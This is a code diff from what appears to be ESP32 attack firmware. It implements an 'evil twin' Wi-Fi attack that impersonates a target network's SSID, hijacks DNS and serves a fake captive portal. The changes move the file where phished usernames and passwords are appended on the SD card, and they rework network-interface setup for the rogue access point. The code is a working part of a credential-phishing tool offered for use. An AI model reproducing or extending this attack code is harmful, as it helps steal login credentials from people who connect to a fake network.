@@ -10,7 +10,7 @@
  *        PHASE B (25 s): raw-IDF AP mode beaconing the target's SSID
  *                        on the target's channel, DNS hijack + HTTP
  *                        captive portal serving HTML_FREEWIFI,
- *                        catches creds to /poseidon/creds.log.
+ *                        catches creds to /poseidon/credentials/creds.log.
  *   3. Cycle repeats until ESC.
  *
  * Why time-slice instead of APSTA: Bruce-pinned libs crash
@@ -91,7 +91,8 @@ static bool s_ap_netif_created  = false;
 
 static void et_log_cred(const String &u, const String &p, const String &src)
 {
-    File f = SD.open("/poseidon/creds.log", FILE_APPEND);
+    sd_ensure_layout();
+    File f = SD.open(SD_CREDS_PATH, FILE_APPEND);
     if (!f) return;
     f.printf("%lu,%s,%s,%s,%s\n",
              (unsigned long)(millis() / 1000),
@@ -139,13 +140,14 @@ static bool et_sta_up(uint8_t channel)
 {
     esp_netif_init();
     esp_event_loop_create_default();
-    /* Gate on the netif actually existing, not a sticky flag — another feature
-     * (e.g. the portal) may have destroyed WIFI_STA_DEF since we last ran, and
-     * a stale flag would leave us with no STA netif. */
-    if (!esp_netif_get_handle_from_ifkey("WIFI_STA_DEF")) {
-        esp_netif_create_default_wifi_sta();
-        s_sta_netif_created = true;
-    }
+    /* Destroy-then-recreate unconditionally rather than gating on an
+     * existence check — full sweep test 2026-09-12 hit a duplicate-key
+     * assert here despite this guard, so the ifkey lookup can't be
+     * trusted alone to reflect the driver's real netif state. */
+    esp_netif_t *old_sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+    if (old_sta) esp_netif_destroy_default_wifi(old_sta);
+    esp_netif_create_default_wifi_sta();
+    s_sta_netif_created = true;
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
     cfg.static_tx_buf_num  = 0;
     cfg.dynamic_tx_buf_num = 8;
@@ -189,10 +191,10 @@ static bool et_ap_up(uint8_t channel)
 {
     esp_netif_init();
     esp_event_loop_create_default();
-    if (!esp_netif_get_handle_from_ifkey("WIFI_AP_DEF")) {
-        esp_netif_create_default_wifi_ap();
-        s_ap_netif_created = true;
-    }
+    esp_netif_t *old_ap = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
+    if (old_ap) esp_netif_destroy_default_wifi(old_ap);
+    esp_netif_create_default_wifi_ap();
+    s_ap_netif_created = true;
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
     cfg.static_tx_buf_num  = 0;
     cfg.dynamic_tx_buf_num = 16;
